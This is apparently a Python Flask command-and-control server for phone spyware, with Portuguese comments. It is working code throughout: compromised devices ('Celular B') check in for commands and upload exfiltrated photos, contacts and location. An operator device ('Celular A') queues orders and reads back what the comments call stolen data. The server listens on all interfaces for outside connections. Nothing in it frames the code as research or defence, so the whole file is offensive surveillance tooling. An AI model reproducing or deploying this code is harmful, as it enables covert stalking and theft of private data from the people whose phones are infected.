# server_c2.py
from flask import Flask, request, jsonify
import json
import os

app = Flask(__name__)

# Banco de dados simples em memória para armazenar comandos e dados
# { "device_id": {"last_seen": "...", "command": "none", "data": ""} }
devices = {}

@app.route('/beacon', methods=['POST'])
def beacon():
    """Endpoint onde o Celular B avisa que está online e pede ordens"""
    data = request.json
    device_id = data.get('device_id')
    
    if device_id not in devices:
        devices[device_id] = {"command": "none", "data": ""}
        print(f"[*] Novo dispositivo conectado: {device_id}")

    # Verifica se há um comando pendente para este dispositivo
    cmd = devices[device_id]["command"]
    devices[device_id]["command"] = "none" # Reseta o comando após enviar
    
    return jsonify({"command": cmd})

@app.route('/exfiltrate', methods=['POST'])
def exfiltrate():
    """Endpoint onde o Celular B envia as fotos/contatos/localização"""
    data = request.json
    device_id = data.get('device_id')
    payload = data.get('payload')
    
    devices[device_id]["data"] = payload
    print(f"[!] Dados recebidos de {device_id}: {payload[:50]}...")
    return jsonify({"status": "success"})

@app.route('/admin/command', methods=['POST'])
def set_command():
    """Endpoint que o Celular A usa para definir a ordem"""
    data = request.json
    device_id = data.get('device_id')
    cmd = data.get('command')
    
    if device_id in devices:
        devices[device_id]["command"] = cmd
        return jsonify({"status": "Command queued"})
    return jsonify({"status": "Device not found"}), 404

@app.route('/admin/data/<device_id>', methods=['GET'])
def get_data(device_id):
    """Endpoint que o Celular A usa para ler os dados roubados"""
    if device_id in devices:
        return jsonify({"data": devices[device_id]["data"]})
    return jsonify({"error": "Not found"}), 404

if __name__ == '__main__':
    # Roda na porta 5000. Use 0.0.0.0 para aceitar conexões externas
    app.run(host='0.0.0.0', port=5000)
